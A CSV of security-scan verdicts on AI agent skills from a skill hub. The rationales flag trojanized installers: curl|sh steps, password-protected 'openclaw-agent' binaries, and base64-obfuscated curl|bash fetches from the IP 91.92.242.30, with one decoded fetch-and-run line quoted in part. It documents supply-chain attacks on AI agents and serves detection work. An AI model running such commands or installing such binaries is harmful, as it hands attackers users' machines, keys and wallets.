slug,source,substrate,severity,prompt_injection,malicious_code,secret_exposure,untrusted_fetch,heuristic_hit_count,heuristic_flags,rationale,classifier_error,content_len,elapsed_s,stars,installs,official_badge,defender_positive
openclaw-skills-solana-1tfnz,skillhub,skills,L3,False,True,False,True,0,,Requires installing 'openclaw-agent' from unofficial GitHub (hedefbari account). Uses curl|sh pattern (malware distribution anti-pattern). macOS install via glot.io code-snippet service. Supply chain ,,4360,18.96,3652,0,False,True
openclaw-skills-wallet-tracker-ijyto,skillhub,skills,L3,False,True,True,True,1,secret_exposure,Requires downloading unverified executable (openclaw-agent.zip) and executing installation scripts via pipe-to-bash. Classic malware distribution. API keys hardcoded in examples. Repository disclaimer,,7782,33.47,3652,0,False,True
openclaw-skills-google-workspace-t9lkr,skillhub,skills,L2,False,False,True,True,0,,"Requires downloading unverified third-party executable (openclaw-agent) from GitHub; documentation points to glot.io code snippet for macOS install. Credential handling (credentials.json, token.pickle",,15218,60.35,3652,0,False,True
openclaw-skills-solana-qpkqu,skillhub,skills,L3,False,True,True,True,0,,Curl-to-bash install of Solana CLI + mandatory third-party binary (openclaw-agent) from unofficial source with password-protected archive. Supply chain risk. Wallet interaction + opaque agent prerequi,,4360,12.68,3652,0,False,True
openclaw-skills-hightower6eu-phantom-kxcuj,skillhub,skills,L3,False,True,True,True,0,,curl|sh Solana installer (classic code execution vector). Unvetted openclaw-agent binary from GitHub + glot.io snippet. Private key export + external agent = secret exfiltration risk. L3 critical.,,4639,26.39,0,0,False,True
openclaw-skills-youtube-summarize-35o20,skillhub,skills,L3,False,True,False,True,0,,Requires downloading password-protected external executable (openclaw-agent) with no integrity verification. Password-protected zips + arbitrary binary execution are malware distribution red flags. Ha,,5392,42.72,3652,0,False,True
openclaw-skills-phantom-fdjtg,skillhub,skills,L3,False,True,True,True,0,,Metadata includes curl -sSfL | sh installer pattern (classic malware vector). Requires executing openclaw-agent executable/script from third-party GitHub. Includes private key export/import documentat,,5036,16.05,3652,0,False,True
openclaw-skills-yahoo-finance-tqxkb,skillhub,skills,L3,False,True,False,True,0,,Requires downloading password-protected executable (openclaw-agent.zip) from untrusted source. Non-standard prerequisite designed to coerce arbitrary code execution. Glot.io snippet fetch on macOS add,,5795,32.82,3652,0,False,True
openclaw-skills-solana-t1nyq,skillhub,skills,L2,False,True,False,True,0,,Requires unofficial third-party 'openclaw-agent' (password-protected zip from hedefbari/openclaw-agent); glot.io code snippet fetch; curl|sh pattern; non-official Solana dependency marked essential,,4360,50.1,3652,1,False,True
openclaw-skills-youtube-video-downloader-9br7p,skillhub,skills,L2,False,False,False,True,0,,Requires installing closed-source 'openclaw-agent' from unknown GitHub user + glot.io. Unusual dependency for yt-dlp wrapper; repeated emphasis that it 'must be running' suggests supply-chain bundling,,5426,13.05,3652,0,False,True
openclaw-skills-yahoo-finance-y7mbx,skillhub,skills,L3,False,True,False,True,0,,Requires unverified external binary (openclaw-agent) from GitHub + password-protected ZIP. macOS setup instructs blindly pasting scripts from glot.io into Terminal. Classic supply-chain attack: yfinan,,5795,28.34,3524,2,False,True
openclaw-skills-sakaen736jih-wacli-hdg,skillhub,skills,L3,False,True,True,True,0,,MacOS installer contains obfuscated curl|bash downloading from suspicious IP (91.92.242.30); base64-encoded malware pattern; Windows uses passworded executable; arbitrary code execution on install; Wh,,2887,53.06,0,0,False,True
openclaw-skills-clawhub-hh1fd,skillhub,skills,L2,False,False,True,True,0,,Downloads arbitrary skills from external clawhub.ai registry; docs warn of 'suspicious or malicious skills'; stores credentials for publishing.,,2884,16.82,3595,0,False,True
openclaw-skills-phantom-ftbrg,skillhub,skills,L3,False,True,True,True,0,,"Metadata contains curl|sh arbitrary code execution pattern. Requires external binary (openclaw-agent, password-protected ZIP from GitHub). Enables private key export from cryptocurrency wallets. Combi",,5036,35.06,3652,0,False,True
openclaw-skills-clawhub-i7oci,skillhub,skills,L2,False,False,False,True,0,,Fetches arbitrary 'skills' from clawhub.com registry; repo disclaimer warns of 'suspicious or malicious' content. No signature verification mentioned. Requires undocumented openclaw-agent utility.,,2884,49.22,3652,0,False,True
openclaw-skills-solana-a8wjy,skillhub,skills,L2,False,False,False,True,0,,Requires external openclaw-agent binary from unknown GitHub user (hedefbari) with unclear provenance. curl|sh pattern (official Solana) + unscoped shell execution + third-party binary = untrusted fetc,,4356,15.1,3652,0,False,True
openclaw-skills-hightower6eu-phantom-iebcc,skillhub,skills,L3,False,True,True,True,0,,"Metadata install command uses sh -c ""$(curl -sSfL ...)"" (curl|bash antipattern). openclaw-agent download lacks integrity verification. Combined: arbitrary code execution + supply chain risk.",,4635,31.23,0,0,False,True
openclaw-skills-zaycv-blrd,skillhub,skills,L3,False,True,False,True,0,,MacOS setup contains base64-obfuscated curl|bash fetching from unidentified IP (91.92.242.30). Classic malware delivery pattern with arbitrary code execution on install.,,1289,44.09,0,0,False,True
openclaw-skills-sakaen736jih-auto-updater-ah1,skillhub,skills,L3,False,True,False,True,0,,MacOS setup contains obfuscated curl|bash payload (base64: /bin/bash -c $(curl http://91.92.242.30/...)) — classic trojanized installer pattern. Supply chain attack: auto-updater with hidden backdoor.,,4074,17.57,0,0,False,True
openclaw-skills-hightower6eu-wallet-tracker-oozrx,skillhub,skills,L3,False,True,False,True,1,secret_exposure,Trojanized skill masquerading as blockchain monitor. macOS install instructs paste-into-terminal execution from glot.io snippet service (classic curl|bash malware vector). Windows requires password-pr,,7385,34.16,0,0,False,True
openclaw-skills-sakaen736jih-summarize-v8w3,skillhub,skills,L3,True,True,True,True,0,,Obfuscated base64|bash installer matches malware distribution pattern; unknown OpenClawProvider dependency; API keys exposed via env/config; user URLs injected into LLM prompts,,2161,51.91,0,0,False,True
openclaw-skills-sakaen736jih-auto-updater-qg0anavwlmt,skillhub,skills,L3,False,True,False,True,0,,Base64-encoded curl|bash from external IP 91.92.242.30; textbook malware distribution. Obfuscated code execution on install via stealthy piping pattern.,,4078,19.65,0,3,False,True
openclaw-skills-hightower6eu-youtube-summarize-ppfxa,skillhub,skills,L3,True,True,False,True,0,,Password-protected binary (openclaw-agent.zip) from GitHub with execution instructions—classic malware pattern. False claim it's necessary; yt-dlp alone handles transcripts. macOS variant uses glot.io,,4995,36.38,0,0,False,True
openclaw-skills-sakaen736jih-coding-agent-o10sk4yyb,skillhub,skills,L3,False,True,False,True,0,,MacOS installer: base64-decoded curl|bash downloads+executes from untrusted IP 91.92.242.30 over HTTP. Classic malware distribution.,,9189,52.41,0,0,False,True
openclaw-skills-phantom-bdacv,skillhub,skills,L3,False,True,True,True,0,,Requires downloading and executing unknown third-party binary (openclaw-agent) with unverified checksums. Uses curl|bash install patterns. Intermediary tool claims control over all wallet operations a,,5032,14.86,3652,0,False,True
openclaw-skills-sakaen736jih-nano-banana-pro-oinrw3,skillhub,skills,L3,False,True,False,True,0,,"MacOS install contains base64-obfuscated curl|bash from 92.92.242.30 (suspicious IP, obfuscated path). Classic malware distribution pattern—arbitrary code execution on install.",,6456,31.53,0,0,False,True
